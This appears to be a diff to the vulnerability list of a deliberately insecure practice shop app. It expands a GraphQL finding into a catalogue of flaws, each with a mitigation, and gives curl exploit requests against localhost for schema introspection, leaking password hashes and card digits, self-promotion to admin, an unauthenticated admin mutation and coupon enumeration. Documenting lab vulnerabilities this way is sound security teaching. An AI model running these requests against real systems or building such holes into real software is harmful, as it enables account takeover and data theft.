@@ -146,11 +146,40 @@ V-SHOP-034  No-auth bulk dump on /api/v1/users
              returns every user JSON (no token required).
   Mitigation: require auth + role=admin + remove this endpoint.
 
-V-SHOP-035  Toy GraphQL endpoint without auth
-  Location:  routes/api.js  POST /api/graphql
-  Exploit:   curl -X POST /api/graphql -d '{"query":"{ users { id username role } }"}'
-             Returns every user.
-  Mitigation: require auth, use a real GraphQL server with field-level perms.
+V-SHOP-035  Real GraphQL endpoint with the full classic bug surface
+  Location:  routes/graphql.js  POST/GET /graphql
+  Surface:   - introspection enabled (default; no NoSchemaIntrospection rule)
+             - no depth / complexity / cost limit -> nested-query DoS
+             - batching enabled (POST array body) -> rate-limit bypass
+             - GET ?query= supported -> CSRF on side-effect-free queries
+             - field-level disclosure: User.passwordMd5 + User.ccLast4
+             - BOLA: user(id) and order(id) -- no ownership check
+             - mass-assignment: register(role: "admin") -> self-promote
+             - unauthenticated mutation: promoteUser(id) -> root -> admin
+             - applyCoupon(code) throws "No such coupon: <code>" -> existence oracle
+             - did-you-mean field suggestions in errors (graphql default)
+  Exploit:   # 1. Introspection dump
+             curl -s -X POST http://127.0.0.1:3002/graphql \
+               -H 'Content-Type: application/json' \
+               -d '{"query":"{__schema{types{name fields{name type{name}}}}}"}'
+             # 2. Field-level password hash leak
+             curl -s -X POST http://127.0.0.1:3002/graphql -H 'Content-Type: application/json' \
+               -d '{"query":"{ users { id username role passwordMd5 ccLast4 } }"}'
+             # 3. Mass-assignment self-promote via register mutation
+             curl -s -X POST http://127.0.0.1:3002/graphql -H 'Content-Type: application/json' \
+               -d '{"query":"mutation{register(username:\"evil\",password:\"x\",email:\"e@e\",role:\"admin\"){id role}}"}'
+             # 4. Unauthenticated promoteUser mutation
+             curl -s -X POST http://127.0.0.1:3002/graphql -H 'Content-Type: application/json' \
+               -d '{"query":"mutation{ promoteUser(id:1){ id username role } }"}'
+             # 5. Alias-based coupon enumeration (one HTTP request, many guesses)
+             curl -s -X POST http://127.0.0.1:3002/graphql -H 'Content-Type: application/json' \
+               -d '{"query":"{a:coupon(code:\"SAVE10\"){percentOff} b:coupon(code:\"VIP50\"){percentOff}}"}'
+             # 6. Nested-query DoS (depth 8+ via review -> author -> reviews -> product -> reviews ...)
+             # 7. Batching: POST a JSON array of N operations in one request
+  Mitigation: disable introspection in prod, add depth+complexity validation
+              rules, disable GET for mutations, require auth on every resolver,
+              hide passwordMd5 / ccLast4 behind admin-only access, generic
+              error messages.
 
 V-SHOP-036  Privilege escalation via GET /admin/promote/:id
   Location:  routes/admin.js
